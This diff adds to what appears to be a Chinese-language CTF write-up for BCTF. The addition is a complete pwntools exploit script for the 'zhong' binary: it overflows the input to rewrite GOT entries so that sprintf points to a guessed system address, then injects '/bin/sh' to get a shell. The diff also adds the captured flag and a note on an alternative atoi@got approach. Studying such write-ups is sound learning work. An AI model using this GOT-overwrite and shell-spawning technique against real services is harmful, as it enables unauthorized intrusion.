@@ -37,6 +37,81 @@ tags:
 
 于是，我开始一遍遍地跑，希望我猜测的地址能够碰上。跑了大概20几次，终于撞上了。得到flag是`BCTF{h0w_could_you_byp4ss_vt4ble_read0nly_ch3cks}`。好吧，readonly check，我也是第一次见到这样的，学习了。
 
+下面是python代码，其中`system`的地址就是我猜测的。
+
+{% highlight python %}
+#!/usr/bin/env python2
+
+from pwn import *
+import sys
+
+if __name__ == '__main__' :
+    context(arch='i386', os='linux')
+    elf = ELF('zhong')
+
+    #ip = "127.0.0.1"
+    ip = sys.argv[1]
+    conn = remote(ip, 6666)
+
+#store name
+    payload = "a\n" + "A"*63 + "\n"
+    conn.recvuntil("Your choice? ")
+    conn.send(payload)
+
+    genPhoneDes = 0x08049b74
+
+#content of GOT before function addresses are resolved
+#len 18
+    gotB4=[0x080486c6, 0x080486d6, 0x080486e6, 0x080486f6, 0x08048706, 0x08048716, 0x08048726, 0xf7cc5570, 0x08048746, 0x08048756, 0x08048766, 0x08048776, 0x08048786, 0x08048796, 0x080487a6, 0x080487b6, 0x080487c6, 0x080487d6]
+    
+    system = 0xf7433da0
+#rewrite the 1st entry(sprint) as system, and make sure the other function calls won't crash
+    funcAddr = [system] + gotB4[1:]
+
+#create the 1st product
+    payload = "a\n" + "B"*31 + "\n4\n-1011111111\n" + "CC" + ''.join([p32(x) for x in funcAddr]) + p32(genPhoneDes) + "D\n"
+    conn.recvuntil("Your choice? ")
+    conn.send(payload)
+
+#generate the menu
+    conn.recvuntil("Your choice? ")
+    conn.send("c\n")
+
+#create the following product
+    for i in range(1,16):
+        conn.recvuntil("Your choice? ")
+        conn.send(payload)
+
+#generate the menu again
+    conn.recvuntil("Your choice? ")
+    conn.send("c\n")
+
+#write to addr storing phone type string 
+    blackberry = 0x0804b0fc
+    payload = "d\nb\n2\nb\n" + str(blackberry-60) + "\n"
+    conn.send(payload)
+    
+#rewrite sprintf@got
+    sprintfGot = 0x0804b00c
+    payload = "b\n" + str(sprintfGot) + "\n"
+    conn.send(payload)
+    conn.recvuntil("Your choice? ")
+
+#calculate wholwsale price of another product
+    payload = "c\nb\n5\nb\n"
+    conn.send(payload)
+    conn.recvuntil("How many do you plan to buy?")
+
+#call sprintf which is system now
+    cmd = "/bin/sh"
+    payload = "10 || " + cmd + "\n"
+    conn.send(payload)
+
+    conn.interactive()
+{% endhighlight %}
+
+后记：阅读其他人的writeup，才知道可以不用暴力碰撞的……只需要通过对`atoi@got`进行一个相对的修改，改为`system`即可。而这是可以通过将`atoi@got`改为存放金钱的指针来完成，然后在减去花费的金额时就可以对那里操作了。太巧妙了！
+
 ## warmup
 
 这道题只有50分，应该不难，但我是一直到周一凌晨1点多才做出来……
